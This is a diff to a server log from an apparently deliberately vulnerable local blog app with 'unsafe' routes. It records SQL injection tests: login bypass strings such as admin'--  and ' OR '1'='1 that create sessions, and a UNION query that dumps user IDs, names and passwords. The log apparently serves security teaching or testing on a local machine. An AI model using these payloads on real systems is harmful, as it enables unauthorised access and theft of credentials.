@@ -1679,3 +1679,853 @@ Require stack:
 18.12.2024, 00:29:46 [info]: [validateAndUpdateSession] Session updated successfully: ID=212a514d-3363-4ee6-85e3-730185169adc
 18.12.2024, 00:29:46 [info]: [deleteSession] Session deleted: ID=212a514d-3363-4ee6-85e3-730185169adc
 18.12.2024, 00:29:46 [info]: [logout] Session deleted successfully: sessionID=212a514d-3363-4ee6-85e3-730185169adc
+18.12.2024, 00:31:32 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:31:33 [info]: [validateLogin] Login successful: username=1234
+18.12.2024, 00:31:33 [info]: [generateUUID] Generated UUID: d75fffda-f041-494d-9839-b83a2fee2ea9
+18.12.2024, 00:31:33 [info]: [generateSession] Starting session creation for user: 1234
+18.12.2024, 00:31:33 [info]: [generateSession] Deleted 0 session(s) for user ID: 7
+18.12.2024, 00:31:33 [info]: [generateSession] Session created: ID=d75fffda-f041-494d-9839-b83a2fee2ea9, user=1234
+18.12.2024, 00:31:33 [info]: [login] Login successful: username=1234, sessionID=d75fffda-f041-494d-9839-b83a2fee2ea9
+18.12.2024, 00:31:34 [info]: [validateAndUpdateSession] Session updated successfully: ID=d75fffda-f041-494d-9839-b83a2fee2ea9
+18.12.2024, 00:31:34 [info]: [getUser] Retrieved username: 1234 for session ID: d75fffda-f041-494d-9839-b83a2fee2ea9
+18.12.2024, 00:31:36 [info]: [validateAndUpdateSession] Session updated successfully: ID=d75fffda-f041-494d-9839-b83a2fee2ea9
+18.12.2024, 00:31:36 [info]: [deleteSession] Session deleted: ID=d75fffda-f041-494d-9839-b83a2fee2ea9
+18.12.2024, 00:31:36 [info]: [logout] Session deleted successfully: sessionID=d75fffda-f041-494d-9839-b83a2fee2ea9
+18.12.2024, 00:32:58 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 00:32:58 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 00:33:16 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 00:33:16 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 00:34:32 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:34:32 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 00:34:32 [info]: [generateUUID] Generated UUID: c84fec85-483c-40f6-aae9-0fb2ee231d2f
+18.12.2024, 00:34:32 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 00:34:33 [info]: [generateSession] User not found: admin' -- 
+18.12.2024, 00:34:33 [error]: [generateSession] Error creating session for user: admin' --  - User not found
+18.12.2024, 00:34:33 [error]: [login] Error during login: User not found
+18.12.2024, 00:34:44 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:34:44 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 00:34:44 [info]: [generateUUID] Generated UUID: c5f6429c-5ccd-4542-b5c6-5cd90fd5187d
+18.12.2024, 00:34:44 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 00:34:44 [info]: [generateSession] User not found: admin' -- 
+18.12.2024, 00:34:44 [error]: [generateSession] Error creating session for user: admin' --  - User not found
+18.12.2024, 00:34:44 [error]: [login] Error during login: User not found
+18.12.2024, 00:36:05 [info]: [validateLogin] User not found: username=admin\' -- 
+18.12.2024, 00:36:05 [info]: [login] Unauthorized login attempt: username=admin\' -- 
+18.12.2024, 00:36:17 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:36:17 [info]: [validateLogin] Login successful: username=admin' -- 
+18.12.2024, 00:36:17 [info]: [generateUUID] Generated UUID: 26ff6fae-a5ba-4c0e-8807-847ffb83b10a
+18.12.2024, 00:36:17 [info]: [generateSession] Starting session creation for user: admin' -- 
+18.12.2024, 00:36:17 [info]: [generateSession] User not found: admin' -- 
+18.12.2024, 00:36:17 [error]: [generateSession] Error creating session for user: admin' --  - User not found
+18.12.2024, 00:36:17 [error]: [login] Error during login: User not found
+18.12.2024, 00:42:46 [info]: Loading route file: route_account_management.js
+18.12.2024, 00:42:46 [info]: Loading route file: route_blog.js
+18.12.2024, 00:42:46 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 00:42:46 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 00:42:46 [info]: Server is running on http://localhost:3000
+18.12.2024, 00:42:46 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 00:42:47 [info]: Database connection established
+18.12.2024, 00:42:48 [info]: Loading route file: route_account_management.js
+18.12.2024, 00:42:48 [info]: Loading route file: route_blog.js
+18.12.2024, 00:42:48 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 00:42:48 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 00:42:48 [info]: Server is running on http://localhost:3000
+18.12.2024, 00:42:48 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 00:42:49 [info]: Database connection established
+18.12.2024, 00:43:22 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:43:22 [info]: [validateLogin] Login successful: username=1234
+18.12.2024, 00:43:22 [info]: [generateUUID] Generated UUID: 6bf2d56d-da91-487b-b37b-0874c1e0e56d
+18.12.2024, 00:43:22 [info]: [generateSession] Starting session creation for user: 1234
+18.12.2024, 00:43:22 [info]: [generateSession] Deleted 0 session(s) for user ID: 7
+18.12.2024, 00:43:22 [error]: [generateSession] Error creating session for user: 1234 - Incorrect datetime value: '2024-12-18T01:43:22.218Z' for column 'expire_date' at row 1
+18.12.2024, 00:43:22 [error]: [login] Error during login: Incorrect datetime value: '2024-12-18T01:43:22.218Z' for column 'expire_date' at row 1
+18.12.2024, 00:44:18 [info]: Loading route file: route_account_management.js
+18.12.2024, 00:44:18 [info]: Loading route file: route_blog.js
+18.12.2024, 00:44:18 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 00:44:18 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 00:44:18 [info]: Server is running on http://localhost:3000
+18.12.2024, 00:44:18 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 00:44:19 [info]: Database connection established
+18.12.2024, 00:44:20 [info]: Loading route file: route_account_management.js
+18.12.2024, 00:44:20 [info]: Loading route file: route_blog.js
+18.12.2024, 00:44:20 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 00:44:20 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 00:44:20 [info]: Server is running on http://localhost:3000
+18.12.2024, 00:44:20 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 00:44:21 [info]: Database connection established
+18.12.2024, 00:44:25 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:44:25 [info]: [validateLogin] Login successful: username=1234
+18.12.2024, 00:44:25 [info]: [generateUUID] Generated UUID: ac5113c2-d691-4dd7-823f-4952315e74c9
+18.12.2024, 00:44:25 [info]: [generateSession] Starting session creation for user: 1234
+18.12.2024, 00:44:25 [error]: [generateSession] Error creating session for user: 1234 - userId is not defined
+18.12.2024, 00:44:25 [error]: [login] Error during login: userId is not defined
+18.12.2024, 00:46:03 [info]: Loading route file: route_account_management.js
+18.12.2024, 00:46:03 [info]: Loading route file: route_blog.js
+18.12.2024, 00:46:03 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 00:46:03 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 00:46:03 [info]: Server is running on http://localhost:3000
+18.12.2024, 00:46:03 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 00:46:04 [info]: Database connection established
+18.12.2024, 00:46:09 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:46:09 [info]: [validateLogin] Login successful: username=1234
+18.12.2024, 00:46:09 [info]: [generateUUID] Generated UUID: 214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:46:09 [info]: [generateSession] Starting session creation for user: 1234
+18.12.2024, 00:46:09 [info]: [generateSession] Deleted 0 session(s) for user ID: 7
+18.12.2024, 00:46:10 [info]: [generateSession] Session created: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe, user=1234
+18.12.2024, 00:46:10 [info]: [login] Login successful: username=1234, sessionID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:46:10 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:46:10 [info]: [getUser] Retrieved username: 1234 for session ID: 214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:46:53 [info]: Loading route file: route_account_management.js
+18.12.2024, 00:46:53 [info]: Loading route file: route_blog.js
+18.12.2024, 00:46:53 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 00:46:53 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 00:46:53 [info]: Server is running on http://localhost:3000
+18.12.2024, 00:46:53 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 00:46:53 [info]: Database connection established
+18.12.2024, 00:47:04 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:04 [info]: [getUser] Retrieved username: 1234 for session ID: 214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:05 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:05 [info]: [session_test] Session valid for sessionID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:10 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:10 [info]: [getUser] Retrieved username: 1234 for session ID: 214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:12 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:13 [info]: [getUser] Retrieved username: 1234 for session ID: 214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:15 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:16 [info]: [getUser] Retrieved username: 1234 for session ID: 214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:17 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:17 [info]: [getUser] Retrieved username: 1234 for session ID: 214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:51 [info]: Loading route file: route_account_management.js
+18.12.2024, 00:47:51 [info]: Loading route file: route_blog.js
+18.12.2024, 00:47:51 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 00:47:51 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 00:47:51 [info]: Server is running on http://localhost:3000
+18.12.2024, 00:47:51 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 00:47:52 [info]: Database connection established
+18.12.2024, 00:47:54 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:55 [info]: [getUser] Retrieved username: 1234 for session ID: 214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:56 [info]: [validateAndUpdateSession] Session updated successfully: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:56 [info]: [deleteSession] Session deleted: ID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:47:56 [info]: [logout] Session deleted successfully: sessionID=214aef8a-d40a-4139-bbc0-1dcdb568befe
+18.12.2024, 00:48:15 [info]: [validateLogin] User not found: username=admin '-- 
+18.12.2024, 00:48:15 [info]: [login] Unauthorized login attempt: username=admin '-- 
+18.12.2024, 00:48:32 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:48:33 [info]: [validateLogin] Login successful: username=admin'-- 
+18.12.2024, 00:48:33 [info]: [generateUUID] Generated UUID: bde61727-8133-4ec9-a898-ec6c7998eb2d
+18.12.2024, 00:48:33 [info]: [generateSession] Starting session creation for user: admin'-- 
+18.12.2024, 00:48:33 [info]: [generateSession] Deleted 0 session(s) for user ID: 5
+18.12.2024, 00:48:33 [info]: [generateSession] Session created: ID=bde61727-8133-4ec9-a898-ec6c7998eb2d, user=admin'-- 
+18.12.2024, 00:48:33 [info]: [login] Login successful: username=admin'-- , sessionID=bde61727-8133-4ec9-a898-ec6c7998eb2d
+18.12.2024, 00:48:33 [info]: [validateAndUpdateSession] Session updated successfully: ID=bde61727-8133-4ec9-a898-ec6c7998eb2d
+18.12.2024, 00:48:34 [info]: [getUser] Retrieved username: admin for session ID: bde61727-8133-4ec9-a898-ec6c7998eb2d
+18.12.2024, 00:48:39 [info]: [validateAndUpdateSession] Session updated successfully: ID=bde61727-8133-4ec9-a898-ec6c7998eb2d
+18.12.2024, 00:48:39 [info]: [deleteSession] Session deleted: ID=bde61727-8133-4ec9-a898-ec6c7998eb2d
+18.12.2024, 00:48:39 [info]: [logout] Session deleted successfully: sessionID=bde61727-8133-4ec9-a898-ec6c7998eb2d
+18.12.2024, 00:49:48 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:49:48 [info]: [validateLogin] Login successful: username=admin' OR '1'='1
+18.12.2024, 00:49:48 [info]: [generateUUID] Generated UUID: b068c6ae-757a-4dfe-bd3f-fc5437f68053
+18.12.2024, 00:49:48 [info]: [generateSession] Starting session creation for user: admin' OR '1'='1
+18.12.2024, 00:49:48 [info]: [generateSession] Deleted 0 session(s) for user ID: 7
+18.12.2024, 00:49:48 [info]: [generateSession] Session created: ID=b068c6ae-757a-4dfe-bd3f-fc5437f68053, user=admin' OR '1'='1
+18.12.2024, 00:49:48 [info]: [login] Login successful: username=admin' OR '1'='1, sessionID=b068c6ae-757a-4dfe-bd3f-fc5437f68053
+18.12.2024, 00:49:49 [info]: [validateAndUpdateSession] Session updated successfully: ID=b068c6ae-757a-4dfe-bd3f-fc5437f68053
+18.12.2024, 00:49:49 [info]: [getUser] Retrieved username: 1234 for session ID: b068c6ae-757a-4dfe-bd3f-fc5437f68053
+18.12.2024, 00:53:21 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 00:53:21 [info]: [validateLogin] Login successful: username=' OR '1'='1
+18.12.2024, 00:53:21 [info]: [generateUUID] Generated UUID: 4e829f64-8036-48f4-a7ba-4f09d9a82162
+18.12.2024, 00:53:21 [info]: [generateSession] Starting session creation for user: ' OR '1'='1
+18.12.2024, 00:53:21 [info]: [generateSession] Deleted 1 session(s) for user ID: 7
+18.12.2024, 00:53:21 [info]: [generateSession] Session created: ID=4e829f64-8036-48f4-a7ba-4f09d9a82162, user=' OR '1'='1
+18.12.2024, 00:53:21 [info]: [login] Login successful: username=' OR '1'='1, sessionID=4e829f64-8036-48f4-a7ba-4f09d9a82162
+18.12.2024, 00:53:21 [info]: [validateAndUpdateSession] Session updated successfully: ID=4e829f64-8036-48f4-a7ba-4f09d9a82162
+18.12.2024, 00:53:21 [info]: [getUser] Retrieved username: 1234 for session ID: 4e829f64-8036-48f4-a7ba-4f09d9a82162
+18.12.2024, 00:53:29 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'int, (SELECT @@version)) --'' at line 1
+18.12.2024, 00:53:29 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'int, (SELECT @@version)) --'' at line 1
+18.12.2024, 00:53:47 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--'' at line 1
+18.12.2024, 00:53:47 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--'' at line 1
+18.12.2024, 00:53:55 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--'' at line 1
+18.12.2024, 00:53:55 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--'' at line 1
+18.12.2024, 00:55:36 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'int, (SELECT @@version)) -- '' at line 1
+18.12.2024, 00:55:36 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'int, (SELECT @@version)) -- '' at line 1
+18.12.2024, 00:55:45 [error]: [validateLogin] Error validating login: The used SELECT statements have a different number of columns
+18.12.2024, 00:55:45 [error]: [login] Error during login: The used SELECT statements have a different number of columns
+18.12.2024, 00:55:58 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 00:55:58 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 00:56:03 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 00:56:03 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 01:00:08 [error]: [validateLogin] Error validating login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 01:00:08 [error]: [login] Error during login: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1
+18.12.2024, 01:32:52 [info]: Loading route file: route_account_management.js
+18.12.2024, 01:32:52 [info]: Loading route file: route_blog.js
+18.12.2024, 01:32:52 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 01:32:52 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 01:32:52 [info]: Server is running on http://localhost:3000
+18.12.2024, 01:32:52 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 01:32:53 [info]: Database connection established
+18.12.2024, 01:33:01 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 01:33:01 [info]: [validateLogin] Login successful: username=1234
+18.12.2024, 01:33:01 [info]: [generateUUID] Generated UUID: 6b83a26f-1806-4e49-acce-4e3338437a21
+18.12.2024, 01:33:01 [info]: [generateSession] Starting session creation for user: 1234
+18.12.2024, 01:33:01 [info]: [generateSession] Deleted 1 session(s) for user ID: 7
+18.12.2024, 01:33:01 [info]: [generateSession] Session created: ID=6b83a26f-1806-4e49-acce-4e3338437a21, user=1234
+18.12.2024, 01:33:01 [info]: [login] Login successful: username=1234, sessionID=6b83a26f-1806-4e49-acce-4e3338437a21
+18.12.2024, 01:33:01 [info]: [validateAndUpdateSession] Session updated successfully: ID=6b83a26f-1806-4e49-acce-4e3338437a21
+18.12.2024, 01:33:01 [info]: [getUser] Retrieved username: 1234 for session ID: 6b83a26f-1806-4e49-acce-4e3338437a21
+18.12.2024, 01:33:16 [info]: [validateAndUpdateSession] Session updated successfully: ID=6b83a26f-1806-4e49-acce-4e3338437a21
+18.12.2024, 01:33:16 [info]: [getUser] Retrieved username: 1234 for session ID: 6b83a26f-1806-4e49-acce-4e3338437a21
+18.12.2024, 01:36:12 [info]: Loading route file: route_account_management.js
+18.12.2024, 01:36:12 [info]: Loading route file: route_blog.js
+18.12.2024, 01:36:12 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 01:36:12 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 01:36:12 [info]: Server is running on http://localhost:3000
+18.12.2024, 01:36:12 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 01:36:13 [info]: Database connection established
+18.12.2024, 01:36:17 [info]: Loading route file: route_account_management.js
+18.12.2024, 01:36:17 [info]: Loading route file: route_blog.js
+18.12.2024, 01:36:17 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 01:36:17 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 01:36:17 [info]: Server is running on http://localhost:3000
+18.12.2024, 01:36:17 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 01:36:18 [info]: Database connection established
+18.12.2024, 01:36:29 [info]: Loading route file: route_account_management.js
+18.12.2024, 01:36:29 [info]: Loading route file: route_blog.js
+18.12.2024, 01:36:29 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 01:36:29 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 01:36:29 [info]: Server is running on http://localhost:3000
+18.12.2024, 01:36:29 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 01:36:30 [info]: Database connection established
+18.12.2024, 01:38:21 [info]: Loading route file: route_account_management.js
+18.12.2024, 01:38:21 [info]: Loading route file: route_blog.js
+18.12.2024, 01:38:21 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 01:38:21 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 01:38:21 [info]: Server is running on http://localhost:3000
+18.12.2024, 01:38:21 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 01:38:22 [info]: Database connection established
+18.12.2024, 01:38:22 [info]: Loading route file: route_account_management.js
+18.12.2024, 01:38:22 [info]: Loading route file: route_blog.js
+18.12.2024, 01:38:22 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 01:38:22 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 01:38:22 [info]: Server is running on http://localhost:3000
+18.12.2024, 01:38:22 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 01:38:23 [info]: Database connection established
+18.12.2024, 01:39:29 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%123%'
+        
+18.12.2024, 01:39:29 [info]: [unsafe_searchPosts] Query executed successfully, returned 1 result(s)
+18.12.2024, 01:47:51 [info]: Loading route file: route_account_management.js
+18.12.2024, 01:47:51 [info]: Loading route file: route_blog.js
+18.12.2024, 01:47:51 [info]: Loading route file: unsafe_route_account_management.js
+18.12.2024, 01:47:51 [info]: Loading route file: unsafe_route_blog.js
+18.12.2024, 01:47:51 [info]: Server is running on http://localhost:3000
+18.12.2024, 01:47:51 [error]: Fehler beim Überprüfen des Uvicorn-Servers: connect ECONNREFUSED 127.0.0.1:8001
+18.12.2024, 01:47:51 [info]: Database connection established
+18.12.2024, 01:48:02 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 01:48:02 [info]: [validateLogin] Login successful: username=1234
+18.12.2024, 01:48:02 [info]: [generateUUID] Generated UUID: 054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:48:02 [info]: [generateSession] Starting session creation for user: 1234
+18.12.2024, 01:48:02 [info]: [generateSession] Deleted 1 session(s) for user ID: 7
+18.12.2024, 01:48:02 [info]: [generateSession] Session created: ID=054be891-f4ba-4d6c-9a1e-5e7b9502eea8, user=1234
+18.12.2024, 01:48:02 [info]: [login] Login successful: username=1234, sessionID=054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:48:02 [info]: [validateAndUpdateSession] Session updated successfully: ID=054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:48:02 [info]: [getUser] Retrieved username: 1234 for session ID: 054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:48:07 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%123%'
+        
+18.12.2024, 01:48:07 [info]: [unsafe_searchPosts] Query executed successfully, returned 1 result(s)
+18.12.2024, 01:48:31 [info]: [validateAndUpdateSession] Session updated successfully: ID=054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:48:31 [info]: [getUser] Retrieved username: 1234 for session ID: 054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:50:10 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT 1, 2, 3 -- %'
+        
+18.12.2024, 01:50:10 [info]: [unsafe_searchPosts] Query executed successfully, returned 4 result(s)
+18.12.2024, 01:51:11 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT id, username, password FROM users --%'
+        
+18.12.2024, 01:51:11 [error]: [unsafe_searchPosts] Error executing query: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '--%'' at line 3
+18.12.2024, 01:52:03 [info]: [unsafe_searchPosts] Executing query: 
+            SELECT title, content, creation_date 
+            FROM posts 
+            WHERE title LIKE '%' UNION SELECT id, username, password FROM users -- %'
+        
+18.12.2024, 01:52:03 [info]: [unsafe_searchPosts] Query executed successfully, returned 7 result(s)
+18.12.2024, 01:57:49 [info]: [validateAndUpdateSession] Session not found or expired: ID=054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:57:50 [info]: [validateAndUpdateSession] Session not found or expired: ID=054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:57:52 [info]: [validateAndUpdateSession] Session not found or expired: ID=054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:57:53 [info]: [validateAndUpdateSession] Session not found or expired: ID=054be891-f4ba-4d6c-9a1e-5e7b9502eea8
+18.12.2024, 01:58:10 [info]: [encryptPassword] New salt generated: $2a$10$pUdOzi468K4h/JtU6x1PcO
+18.12.2024, 01:58:10 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 01:58:11 [info]: [createUser] User successfully created: ID=9
+18.12.2024, 01:58:11 [info]: [register] User registered successfully: username=admin, userId=9
+18.12.2024, 01:58:17 [info]: [encryptPassword] Password encrypted successfully
+18.12.2024, 01:58:18 [info]: [validateLogin] Login successful: username=admin
+18.12.2024, 01:58:18 [info]: [generateUUID] Generated UUID: 5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:58:18 [info]: [generateSession] Starting session creation for user: admin
+18.12.2024, 01:58:19 [info]: [generateSession] Deleted 0 session(s) for user ID: 9
+18.12.2024, 01:58:19 [info]: [generateSession] Session created: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547, user=admin
+18.12.2024, 01:58:19 [info]: [login] Login successful: username=admin, sessionID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:58:19 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:58:20 [info]: [getUser] Retrieved username: admin for session ID: 5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:58:22 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:58:23 [info]: [getUser] Retrieved username: admin for session ID: 5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:58:56 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:58:56 [info]: Post created successfully with ID: 4
+18.12.2024, 01:59:00 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:59:00 [info]: [getUser] Retrieved username: admin for session ID: 5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:59:24 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:59:25 [info]: Post created successfully with ID: 5
+18.12.2024, 01:59:28 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:59:28 [info]: [getUser] Retrieved username: admin for session ID: 5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:59:51 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:59:51 [info]: Post created successfully with ID: 6
+18.12.2024, 01:59:52 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 01:59:53 [info]: [getUser] Retrieved username: admin for session ID: 5fa49feb-b935-4524-9e0b-ff9f6b2f9547
+18.12.2024, 02:00:22 [info]: [validateAndUpdateSession] Session updated successfully: ID=5fa49feb-b935-4524-9e0b-ff9f6b2f9547
